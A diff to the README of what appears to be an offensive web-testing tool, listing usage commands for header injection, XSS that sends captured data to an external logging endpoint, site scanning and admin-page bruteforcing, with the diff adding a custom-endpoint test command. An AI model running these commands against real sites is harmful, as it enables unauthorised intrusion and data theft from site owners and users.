@@ -164,16 +164,21 @@ shadecreed-inject -u https://target.com/api -m POST -s headers.json -r true
 shadecreed-xss --url https://target.com/page --script payload.js --endpoint https://mycustomendpoint.com/log
 ```
 
+**Test custom endpoint:**
+```bash
+shadecreed-test <Custom_Endpoint>
+```
+
 **Scan a site for vulnerabilities:**
 ```bash
 shadecreed-scan --url https://victim.com
 ```
 
-
 **Perform custom bruteforce:**
 ```bash
 shadecreed-brute --url https://myhome/admin --redirect true
 ```
+
 ---
 
 ## 🕷️ Custom XSS Template
